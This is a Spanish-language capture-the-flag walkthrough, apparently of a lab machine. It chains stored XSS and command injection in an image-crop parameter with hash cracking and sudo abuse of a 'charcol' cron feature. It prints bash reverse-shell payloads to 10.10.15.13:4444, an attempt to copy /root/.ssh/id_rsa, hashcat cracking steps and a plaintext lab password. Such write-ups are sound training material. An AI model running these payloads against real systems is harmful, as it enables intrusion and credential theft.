Enumeración web#

Nuestro siguiente paso será enumerar la página web, una vez entramos a la web vemos que tenemos tanto un panel de login y de register. Con lo cual nos registramos en la web para ver funcionalidades descubrimos.

Vulnerabilidad XSS Almacenado - Report_bug#

Intento realizar ataques XSS (Cross Side Scripting) en las opciones para ver si se refleja mis payloads como notificación al enviar pero ninguno me muestra nada, también compruebo si mis payloads se muestran almacenados en el apartado Galería pero no hay suerte.

Entonces de lo siguiente que me doy cuenta es que en el código fuente tenemos el apartado de los scripts los cuales podemos analizar.

Enumerándolo nos encontramos con las funciones que existen sobre el reporte de bugs.

Entendiendo la vulnerabilidad#

Función submitBugReport#

Primero nos encontramos con la función submit_report la cual almacena el report del usuario en el servidor como json.

Parámetros requeridos para que el report sea aceptado:

  • bugName: Nombre que le daremos al report-
  • bugDetails: Parámetro que usaré para inyectar el payload.

En el caso de que alguno de estos dos parámetros no existan, no podremos subir el reporte malicioso.

Función loadBugReport#

Aquí viene la parte donde se da la vulnerabilidad por una mala sanitización al renderizar los details desde el servidor.

Hay dos puntos claves por los que se da esta vulnerabilidad:

  • reportCard.innerHTML: Todas las variables que son asignadas como innerHTML, es decir, permite ejecutar código ya que lo que se busca es generar HTML dinámico.
  • ${report.details}: Muestra los detalles del report sin ningún tipo de sanitización lo que nos permite llevar a cabo el XSS almacenado.

Ahora que ya sabemos porque ocurre esta vulnerabilidad, tratamos de enumerar y extraer el contenido de archivos haciendo uso del XSS.

Funciones executeVisualTransform y apply_visual_transform#

Vemos que en el parámetro Crop dentro de la función executeVisualTransform filtra si los parámetros son enteros o no.

Luego se ejecuta el cambio con los parámetros indicados haciendo uso de la función apply_visual_transform.

Explotación de RCE + Reverse Shell#

Subimos una imagen cualquiera a la página web para luego editarla.

Gallery -> … -> Transform Image -> Apply Transform

Al ejecutar el Apply Transform, interceptaremos la petición con Burpsuit. En este momento añadiremos nuestro payload ya que así le haremos un bypass a la comprobación de enteros que realiza el código.

"0;bash -c \"bash -i >& /dev/tcp/10.10.15.13/4444 0>&1\"; #"

Movimiento Lateral#

Una vez obtenemos la shell empiezo a buscar contraseñas o hashes en los archivos de la web pero no encuentro nada que me sirva para convertirme en el usuario Mark.

Entonces enumerando las carpetas /opt y /var, encuentro una backup de la web llamada web_20250806_120723.zip.aes

aescrypt2hashcat.pl web_20250806_120723.zip.aes

Una vez con el hash aescrypt obtenido procedemos a crackearlo con hashcat.

hashcat -m 22400 -a 0 web.hash /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt

Una vez con la contraseña del archivo .aes lo desencryptamos con la herramienta pyAesCrypt:

./pyAesCrypt -d ../../web_20250806_120723.zip.aes

Una vez esto nos permite descomprimir el archivo zip para ver su contenido.

unzip web_20250806_120723.zip

En el vemos un backup de lo que sería la página web pero con una diferencia en el archivo db.json. En el encontramos el hash de Mark.

Entonces mediante crackstation lo crackeamos y elevamos nuestros privilegios en la máquina.

mark:supersmash

su mark

Escalada de privilegios#

Rápidamente vemos que el usuario Mark tiene la capacidad de ejecutar el binario charcol como root sin proporcionar credenciales.

sudo -l

Entonces lo primero que probamos es ejecutar el binario para ver de que se trata y que podemos hacer.

sudo charcol

Vemos que la aplicación nos sugiere ahora que usemos los siguientes comandos charcol shell para abrir una shell interactiva o charcol help para ver que comandos podemos ejecutar.

En nuestro caso ejecutamos la shell para ver podemos ejecutar.

sudo charcol shell

Una vez ejecutamos la shell interactiva y vemos las tareas que podemos hacer, comprobamos que podemos hacer backups a los paths que le indiquemos o programar cron jobs.

En un principio pruebo a copiar el archivo /root/.ssh/id_rsa pero no nos deja debido a que el archivo esta en una parte critica del systema.

backup -i /root/.ssh/id_rsa -o /tmp/id_rsa -p 12345 --type tar.gz -c 9

Con lo cual el siguiente paso que nos queda por ver son los cron jobs. Entonces configuramos un trabajo que nos lanza una reverse shell a nuestro listener.

auto add --schedule "* * * * *" --command "bash -c 'bash -i >& /dev/tcp/10.10.15.13/4444 0>&1'" --name "pwn"
